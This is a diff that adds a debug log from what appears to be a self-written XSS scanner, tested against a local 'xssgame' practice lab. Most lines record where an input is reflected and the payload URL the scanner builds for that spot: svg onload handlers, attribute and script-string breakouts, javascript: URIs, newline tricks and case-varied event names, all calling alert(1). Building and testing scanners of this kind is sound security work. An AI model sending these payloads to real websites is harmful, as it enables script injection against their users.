@@ -1,0 +1,1278 @@
+[32m[2020-04-02 13:46:15,055] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 13:46:15,067] [log.py:91] [log:__console] [INFO]- 检测xss第一个参数[0m
+[32m[2020-04-02 13:48:40,960] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 13:48:40,983] [log.py:91] [log:__console] [INFO]- 检测xss第0个参数[0m
+[32m[2020-04-02 13:49:13,674] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 13:49:13,722] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 13:49:13,735] [log.py:91] [log:__console] [INFO]- 检测xss第2个参数[0m
+[32m[2020-04-02 13:49:52,226] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 13:49:52,333] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 13:49:52,377] [log.py:91] [log:__console] [INFO]- 检测xss第2个参数[0m
+[32m[2020-04-02 13:51:39,051] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 13:51:39,128] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 13:51:39,162] [log.py:91] [log:__console] [INFO]- 检测xss第2个参数[0m
+[32m[2020-04-02 13:53:19,584] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 13:53:19,673] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 13:54:15,739] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 13:54:15,820] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 13:54:29,761] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 13:54:29,844] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 13:55:00,096] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 13:55:00,173] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 13:55:00,219] [log.py:91] [log:__console] [INFO]- 检测xss第2个参数[0m
+[32m[2020-04-02 14:03:37,884] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 14:03:37,961] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 14:03:38,014] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level1.php?name=<svg onload=alert(1)>&x=2[0m
+[32m[2020-04-02 14:07:57,243] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 14:07:57,313] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 14:07:57,376] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level2.php?keyword=<svg onload=alert(1)>[0m
+[32m[2020-04-02 14:10:05,834] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 14:10:05,907] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 14:11:56,637] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 14:11:56,687] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 14:11:56,769] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level2.php?keyword=<svg onload=alert(1)>[0m
+[32m[2020-04-02 14:12:08,803] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 14:12:08,890] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 14:48:24,269] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 14:48:24,341] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 14:48:24,385] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 14:48:24,445] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level2.php?keyword=<svg onload=alert(1)>[0m
+[32m[2020-04-02 14:48:36,693] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 14:48:36,752] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 14:48:36,787] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 14:48:36,868] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level2.php?keyword=<svg onload=alert(1)>[0m
+[32m[2020-04-02 14:49:52,750] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 14:49:52,795] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 14:49:52,828] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 14:49:52,890] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level2.php?keyword=yy78pq"onclick="alert(1)[0m
+[32m[2020-04-02 14:50:19,941] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 14:50:20,029] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 14:50:20,051] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}][0m
+[32m[2020-04-02 14:50:20,076] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level1.php?name=<svg onload=alert(1)>&x=2[0m
+[32m[2020-04-02 14:50:39,030] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 14:50:39,108] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 14:50:39,143] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}][0m
+[32m[2020-04-02 14:50:39,182] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level1.php?name=<svg onload=alert(1)>&x=2[0m
+[32m[2020-04-02 14:50:54,302] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 14:51:35,988] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 14:51:36,080] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 14:51:36,108] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-02 14:51:36,145] [log.py:91] [log:__console] [INFO]- False[0m
+[32m[2020-04-02 14:55:40,050] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 14:55:40,179] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 14:55:40,205] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-02 14:55:40,238] [log.py:91] [log:__console] [INFO]- javascript:alert(1)[0m
+[32m[2020-04-02 14:56:06,927] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 14:56:07,006] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 14:56:07,030] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-02 14:56:07,058] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level8.php?keyword=javascript:alert(1)&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5[0m
+[32m[2020-04-02 14:57:22,695] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 14:57:22,763] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 14:57:22,788] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}, {'type': 'script_data', 'text': 'var a ="yy78pq";'}][0m
+[32m[2020-04-02 14:57:22,809] [log.py:91] [log:__console] [INFO]- False[0m
+[32m[2020-04-02 15:08:12,041] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 15:08:12,115] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 15:08:12,148] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}, {'type': 'script_data', 'text': 'var a ="yy78pq";'}][0m
+[32m[2020-04-02 15:08:12,212] [log.py:91] [log:__console] [INFO]- False[0m
+[32m[2020-04-02 15:09:46,059] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 15:09:46,133] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 15:09:46,168] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}, {'type': 'script_data', 'text': 'var a ="yy78pq";'}][0m
+[32m[2020-04-02 15:09:46,260] [log.py:91] [log:__console] [INFO]- False[0m
+[32m[2020-04-02 15:10:43,410] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 15:10:43,490] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 15:10:43,531] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}, {'type': 'script_data', 'text': 'var a ="yy78pq";'}][0m
+[32m[2020-04-02 15:10:43,601] [log.py:91] [log:__console] [INFO]- False[0m
+[32m[2020-04-02 15:11:04,690] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 15:11:22,233] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 15:11:28,766] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}, {'type': 'script_data', 'text': 'var a ="yy78pq";'}][0m
+[32m[2020-04-02 15:14:59,943] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 15:14:59,996] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 15:15:00,018] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}, {'type': 'script_data', 'text': 'var a ="yy78pq";'}][0m
+[32m[2020-04-02 15:15:00,094] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level9.php?name=yy78pq";alert(1)//[0m
+[32m[2020-04-02 15:16:55,242] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 15:16:55,287] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 15:16:55,310] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': "<input name=keyword  value='yy78pq'>"}][0m
+[32m[2020-04-02 15:16:55,362] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level3.php?keyword=yy78pq'onclick='alert(1)[0m
+[32m[2020-04-02 15:17:54,389] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 15:17:54,481] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 15:17:54,504] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}, {'type': 'script_data', 'text': "var a ='yy78pq';"}][0m
+[32m[2020-04-02 15:17:54,546] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level9a.php?name=yy78pq';alert(1)//[0m
+[32m[2020-04-02 15:19:02,416] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 15:19:02,459] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 15:19:02,481] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}, {'type': 'script_data', 'text': "var a ='yy78pq';"}][0m
+[32m[2020-04-02 15:19:02,527] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level9a.php?name=yy78pq';alert(1)//[0m
+[32m[2020-04-02 15:19:28,939] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 15:19:29,005] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 15:19:29,029] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}, {'type': 'script_data', 'text': "\nvar a='ss';//x=yy78pq\nvar b=a;\n"}][0m
+[32m[2020-04-02 15:23:29,575] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 15:23:29,590] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 15:23:29,595] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}, {'type': 'script_data', 'text': '\nvar a=\'ss\';//x="yy78pq";\nvar b=a;\n'}][0m
+[32m[2020-04-02 15:23:29,614] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level11.php?name=yy78pq";alert(1)//[0m
+[32m[2020-04-02 15:27:00,510] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 15:27:00,523] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 15:27:00,537] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}, {'type': 'script_data', 'text': '\nvar a=\'ss\';//x="yy78pq";\nvar b=a;\n'}][0m
+[32m[2020-04-02 15:27:00,568] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level11.php?name=yy78pq";alert(1)//[0m
+[32m[2020-04-02 15:27:48,754] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 15:27:48,768] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 15:30:02,289] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 15:30:02,314] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 15:30:02,330] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}, {'type': 'script_data', 'text': '\nvar a=\'ss\';x="yy78pq";\nvar b=a;\n'}][0m
+[32m[2020-04-02 15:30:02,340] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level11.php?name=yy78pq";alert(1)//[0m
+[32m[2020-04-02 15:30:38,635] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 15:30:38,650] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 15:30:38,667] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}, {'type': 'script_data', 'text': '\nvar a=\'ss\';//dsadas\nx="yy78pq";\nvar b=a;\n'}][0m
+[32m[2020-04-02 15:30:38,699] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level11.php?name=yy78pq";alert(1)//[0m
+[32m[2020-04-02 15:30:47,759] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 15:30:47,772] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 15:30:47,794] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}, {'type': 'exp_script_data', 'text': '\nvar a=\'ss\';//dsadasx="yy78pq";\nvar b=a;\n'}][0m
+[32m[2020-04-02 15:30:47,812] [log.py:91] [log:__console] [INFO]- False[0m
+[32m[2020-04-02 15:32:33,086] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 15:32:33,110] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 15:32:33,117] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}, {'type': 'exp_script_data', 'text': '\nvar a=\'ss\';//x="yy78pq";\nvar b=a;\n'}][0m
+[32m[2020-04-02 15:32:33,123] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//[0m
+[32m[2020-04-02 18:18:48,505] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 18:18:48,562] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 18:18:48,568] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}][0m
+[32m[2020-04-02 18:18:48,574] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level1.php?name=<svg onLoaD=alert(1)>&x=2[0m
+[32m[2020-04-02 18:19:35,942] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 18:19:35,960] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 18:19:35,979] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}][0m
+[32m[2020-04-02 18:20:22,283] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 18:20:22,300] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 18:20:22,305] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}][0m
+[32m[2020-04-02 18:21:05,306] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 18:21:05,333] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 18:21:05,338] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}][0m
+[32m[2020-04-02 18:21:05,344] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level1.php?name=%3Csvg%20onload%3Dalert%281%29%3E&x=2[0m
+[32m[2020-04-02 18:21:22,430] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 18:21:22,458] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 18:21:22,474] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}][0m
+[32m[2020-04-02 18:21:22,496] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level1.php?name=%3Csvg%20onload%3Dalert%281%29%3E&x=2[0m
+[32m[2020-04-02 18:21:34,738] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 18:21:34,768] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 18:21:34,783] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}][0m
+[32m[2020-04-02 18:21:34,800] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level1.php?name=<svg onLoAd=alert(1)>&x=2[0m
+[32m[2020-04-02 18:21:37,210] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 18:21:37,247] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 18:21:37,264] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}][0m
+[32m[2020-04-02 18:21:37,282] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level1.php?name=<svg onlOAd=alert(1)>&x=2[0m
+[32m[2020-04-02 18:22:33,179] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 18:22:33,217] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 18:22:33,233] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}][0m
+[32m[2020-04-02 18:22:33,249] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level1.php?name=%3Csvg%20OnLoad%3Dalert%281%29%3E&x=2[0m
+[32m[2020-04-02 18:22:36,159] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 18:22:36,197] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 18:22:36,214] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}][0m
+[32m[2020-04-02 18:22:36,236] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level1.php?name=%3Csvg%20onload%3Dalert%281%29%3E&x=2[0m
+[32m[2020-04-02 18:22:38,981] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 18:22:39,008] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 18:22:39,014] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}][0m
+[32m[2020-04-02 18:22:39,019] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level1.php?name=%3Csvg%20onLoAd%3Dalert%281%29%3E&x=2[0m
+[32m[2020-04-02 18:22:41,094] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 18:22:41,120] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 18:22:41,126] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}][0m
+[32m[2020-04-02 18:22:41,131] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level1.php?name=%3Csvg%20ONload%3Dalert%281%29%3E&x=2[0m
+[32m[2020-04-02 18:22:49,051] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 18:22:49,082] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 18:22:49,091] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}][0m
+[32m[2020-04-02 18:22:49,108] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level1.php?name=%3Csvg%20onload%3Dalert%281%29%3E&x=2[0m
+[32m[2020-04-02 18:22:51,062] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 18:22:51,113] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 18:22:51,125] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}][0m
+[32m[2020-04-02 18:22:51,146] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level1.php?name=%3Csvg%20ONload%3Dalert%281%29%3E&x=2[0m
+[32m[2020-04-02 18:24:13,952] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 18:24:13,968] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 18:24:13,976] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 18:24:14,000] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level5.php?keyword=yy78pq%22onclick%3D%22alert%281%29[0m
+[32m[2020-04-02 18:46:22,093] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 18:46:22,107] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 18:46:22,117] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 18:46:31,675] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 18:46:31,688] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 18:46:31,699] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 18:46:31,729] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level5.php?keyword=[0m
+[32m[2020-04-02 18:47:24,825] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 18:47:41,797] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 18:47:46,499] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 18:47:58,250] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level5.php?keyword=[0m
+[32m[2020-04-02 18:48:32,368] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 18:48:32,400] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 18:48:32,417] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 18:50:19,788] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 18:50:19,801] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 18:50:19,807] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 18:50:19,850] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level5.php?keyword=[0m
+[32m[2020-04-02 18:50:28,031] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 18:50:28,061] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 18:50:28,090] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 19:45:51,640] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level5.php?keyword=[0m
+[32m[2020-04-02 19:46:39,890] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 19:46:39,917] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 19:46:39,928] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 19:46:39,959] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level5.php?keyword=[0m
+[32m[2020-04-02 19:47:10,665] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 19:47:10,679] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 19:47:10,684] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 19:47:10,707] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level5.php?keyword=[0m
+[32m[2020-04-02 19:47:46,109] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 19:47:46,126] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 19:47:46,133] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 19:47:46,182] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level5.php?keyword=yy78pq"><iframe src="javascript:alert(1)[0m
+[32m[2020-04-02 20:12:40,020] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 20:12:40,033] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
